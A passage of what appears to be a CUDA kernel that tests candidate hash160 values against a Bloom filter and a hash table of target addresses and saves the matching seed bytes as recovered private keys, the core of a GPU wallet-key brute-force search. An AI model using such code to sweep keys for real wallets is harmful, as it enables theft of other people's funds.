    if ((bloom_bits[word1] & mask1) && (bloom_bits[word2] & mask2)) {
        // ---- 7. Hash table lookup (linear probing) ----
        uint32_t pos = (h1 ^ h2) & (table_size - 1);
        uint32_t max_probes = 16;
        for (uint32_t i=0; i<max_probes; i++) {
            const uint8_t *entry = hash_table + pos * 20;
            // check if empty (all zeros)
            int empty = 1;
            #pragma unroll
            for (int j=0; j<20; j++) {
                if (entry[j]) { empty = 0; break; }
            }
            if (empty) break;
            if (dev_memcmp(entry, hash160, 20) == 0) {
                uint32_t cnt = atomicInc(found_count, 0xFFFFFFFF);
                if (cnt < MAX_FOUND) {
                    found_indices[cnt] = idx;
                    uint8_t *dest = priv_keys + cnt * 32;
                    #pragma unroll
                    for (int j=0; j<32; j++) dest[j] = seed_bytes[j];
                }
                break;
            }
            pos = (pos + 1) & (table_size - 1);
        }
    }
}
